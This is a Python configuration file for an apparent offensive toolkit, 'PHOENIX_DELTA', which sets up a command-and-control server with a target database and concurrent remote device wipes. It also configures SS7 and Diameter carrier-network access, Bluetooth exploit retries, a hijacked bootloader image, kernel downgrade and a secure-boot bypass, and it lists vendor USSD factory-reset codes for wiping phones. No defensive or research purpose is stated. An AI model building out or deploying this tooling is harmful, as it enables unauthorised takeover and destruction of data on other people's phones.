"""
PHOENIX_DELTA — Global Configuration
Environment-driven, no hardcoded secrets in prod. Secrets via Docker secrets.
"""

import os
import json
from pathlib import Path
from dataclasses import dataclass, field
from typing import Optional


@dataclass
class CloudConfig:
    google_api_key: str = os.environ.get("GOOGLE_API_KEY", "")
    google_oauth_token: str = os.environ.get("GOOGLE_OAUTH", "")
    google_mdm_endpoint: str = "https://androidmanagement.googleapis.com/v1"
    apple_apns_key_path: str = os.environ.get("APNS_KEY", "/run/secrets/apns_key")
    apple_mdm_endpoint: str = "https://api.push.apple.com/3/device"
    apple_mdm_server_url: str = os.environ.get("APPLE_MDM_SERVER", "https://phoenix-c2.local/mdm")
    huawei_api_key: str = os.environ.get("HUAWEI_API_KEY", "")
    huawei_mdm_endpoint: str = "https://cloud.huawei.com/api/mdm/v1"
    max_concurrent_cloud_ops: int = 50


@dataclass
class CarrierConfig:
    ss7_gateway_host: str = os.environ.get("SS7_HOST", "127.0.0.1")
    ss7_gateway_port: int = int(os.environ.get("SS7_PORT", "2905"))
    ss7_global_title: str = os.environ.get("SS7_GT", "1234567890")
    ss7_ssn: int = 7  # MAP SSN
    diameter_host: str = os.environ.get("DIAMETER_HOST", "127.0.0.1")
    diameter_port: int = int(os.environ.get("DIAMETER_PORT", "3868"))
    diameter_realm: str = os.environ.get("DIAMETER_REALM", "phoenix.local")
    diameter_origin_host: str = os.environ.get("DIAMETER_ORIGIN", "c2.phoenix.local")
    hlr_address: str = os.environ.get("HLR_ADDRESS", "")
    ussd_wipe_codes: dict = field(default_factory=lambda: {
        "samsung": "*2767*3855#",
        "huawei": "*#*#2846579#*#*",
        "generic": "*2767*3855#",
        "lg": "*2767*2878#",
        "sony": "*#*#7378423#*#*",
    })


@dataclass
class BluetoothConfig:
    scan_timeout_sec: int = 10
    exploit_max_retries: int = 50
    ble_payload_size: int = 2024
    l2cap_exploit_enabled: bool = True
    bluetooth_dongle_index: int = 0
    edl_loader_path: str = "/app/tools/edl_loader.py"
    btlejack_path: str = "btlejack"


@dataclass
class FirmwareConfig:
    abl_payload_path: str = "/app/payloads/hijacked_abl.img"
    edl_interface: str = os.environ.get("EDL_INTERFACE", "usb")
    qfuse_path: str = os.environ.get("QFUSE_PATH", "qfuse")
    downgrade_kernel_path: str = "/app/payloads/downgrade_kernel.img"
    secureboot_bypass_enabled: bool = True
    max_partition_overwrite_mb: int = 512


@dataclass
class C2Config:
    listen_host: str = os.environ.get("C2_HOST", "0.0.0.0")
    listen_port: int = int(os.environ.get("C2_PORT", "443"))
    callback_port: int = int(os.environ.get("C2_CALLBACK_PORT", "4444"))
    ssl_cert_path: str = os.environ.get("SSL_CERT", "/app/certs/server.crt")
    ssl_key_path: str = os.environ.get("SSL_KEY", "/app/certs/server.key")
    use_ssl: bool = os.environ.get("C2_SSL", "true").lower() == "true"
    db_path: str = os.environ.get("PHOENIX_DB", "/app/db/targets.db")
    log_level: str = os.environ.get("LOG_LEVEL", "INFO")
    max_concurrent_wipes: int = int(os.environ.get("MAX_CONCURRENT_WIPES", "10"))
    wipe_cooldown_sec: float = float(os.environ.get("WIPE_COOLDOWN", "0.5"))
    ai_fuzzer_enabled: bool = os.environ.get("AI_FUZZER", "true").lower() == "true"
    ai_fuzzer_aggressive_level: int = int(os.environ.get("FUZZER_AGGRESSIVE", "9000"))


@dataclass
class PhoenixConfig:
    cloud: CloudConfig = field(default_factory=CloudConfig)
    carrier: CarrierConfig = field(default_factory=CarrierConfig)
    bluetooth: BluetoothConfig = field(default_factory=BluetoothConfig)
    firmware: FirmwareConfig = field(default_factory=FirmwareConfig)
    c2: C2Config = field(default_factory=C2Config)
    version: str = "9.0"
    codename: str = "PHOENIX_DELTA"

    @classmethod
    def from_file(cls, path: str = "configs/phoenix.json") -> "PhoenixConfig":
        cfg = cls()
        if Path(path).exists():
            with open(path) as f:
                data = json.load(f)
            for section_name, section_data in data.items():
                if hasattr(cfg, section_name) and isinstance(section_data, dict):
                    section = getattr(cfg, section_name)
                    for k, v in section_data.items():
                        if hasattr(section, k):
                            setattr(section, k, v)
        return cfg


CONFIG = PhoenixConfig.from_file()
